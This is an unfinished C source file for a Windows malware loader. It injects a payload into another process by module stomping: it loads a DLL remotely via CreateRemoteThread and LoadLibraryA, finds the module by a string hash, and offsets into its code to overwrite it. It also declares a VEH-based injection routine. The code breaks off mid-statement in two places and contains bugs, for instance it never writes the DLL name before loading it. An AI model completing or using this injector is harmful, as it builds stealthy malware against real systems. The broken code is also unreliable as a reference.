#include <Windows.h>
#include <Psapi.h>

typedef NTSTATUS(NTAPI* pNtQueryInformationProcess)(_In_ HANDLE ProcessHandle, _In_ int ProcessInformationClass, _Out_ PVOID ProcessInformation, _In_ ULONG ProcessInformationLength, _Out_ PULONG ReturnLength OPTIONAL);
typedef HRESULT(WINAPI* pRtlEncodeRemotePointer)(_In_ HANDLE ProcessToken, _In_opt_ PVOID Ptr, _Out_ PVOID* EncodedPtr);
typedef NTSTATUS(NTAPI* pNtQuerySystemInformation)(
	SYSTEM_INFORMATION_CLASS SystemInformationClass,
	PVOID                    SystemInformation,
	ULONG                    SystemInformationLength,
	PULONG                   ReturnLength
	);
typedef HMODULE(WINAPI* fnLoadLibraryA)(_In_ LPCSTR lpLibFileName);

BOOL VehInject(
    _In_ PCHAR ProcessPath,
    _In_ PBYTE Payload,
    _In_ SIZE_T PayloadSize
);

ULONG HashString(
	_In_ PVOID String,
	_In_ ULONG Length
) {
	ULONG  Hash = { 0 };
	PUCHAR Ptr = { 0 };
	UCHAR  Char = { 0 };

	Hash = 5381;
	Ptr = String;

	do {
		Char = *Ptr;

		if (!Length) {
			if (!*Ptr) break;
		}
		else {
			if (U_PTR(Ptr - U_PTR(String)) >= Length) break;
			if (!*Ptr) ++Ptr;
		}

		/* turn current character to uppercase */
		if (Char >= 'a') {
			Char -= 0x20;
		}

		/* append hash */
		Hash = ((Hash << 5) + Hash) + Char;

		++Ptr;
	} while (TRUE);

	return Hash;
}

BOOL RemoteModuleStomp(
	_In_ HANDLE hProcess,
	_In_ LPSTR szDll,
	_In_ ULONG uDllSize,
	_In_ PVOID pPayload,
	_In_ SIZE_T sPayloadSize
) {

	PVOID pMemory = NULL, MmName = NULL, pModuleBase = NULL;
	PVOID ModuleList[256] = { 0 };
	DWORD ModuleSize = { 0 };
	SIZE_T ModuleCount = { 0 };
	CHAR ModuleName[MAX_PATH] = { 0 };
	ULONG uProtect = { 0 }, Hash = { 0 };
	HANDLE hThread = NULL;
	fnLoadLibraryA pLoadLibraryA = NULL;

	if (!(pLoadLibraryA = (fnLoadLibraryA)GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA")))
		return FALSE;

	if (!szDll || !pPayload || !sPayloadSize) {
		return FALSE;
	}

	if (!(MmName = VirtualAllocEx(hProcess, 0, uDllSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))) {
		return FALSE;
	}

	if (!CreateRemoteThread(hProcess, NULL, 0, pLoadLibraryA, MmName, NULL, NULL)) {
		return FALSE;
	}

	Hash = HashString(szDll, 0);

	EnumProcessModules(hProcess, ModuleList, sizeof(ModuleList), &ModuleSize);
	ModuleCount = ModuleSize / sizeof(PVOID);

	for (SIZE_T i = 0; i < ModuleCount; i++) {
		GetModuleBaseNameA(hProcess, ModuleList[i], ModuleName, sizeof(ModuleName));
		if (HashString(ModuleName, 0) == Hash) {
			pModuleBase = ModuleList[i];
			break;
		}
	}

	pModuleBase += 0x1000;

	if 
}


int main(int argc, char* argv[])
{
    HANDLE hProcess = NULL, hThread = NULL;
	BOOL bSuccess = FALSE;
	HRESULT NtSuccess = 0x00;
	STARTUPINFOA StartupInfo = { 0 };
	PROCESS_INFORMATION ProcessInfo = { 0 };

	ZeroMemory(&StartupInfo, sizeof(STARTUPINFOA));
	ZeroMemory(&ProcessInfo, sizeof(PROCESS_INFORMATION));

	if (!Create)

}
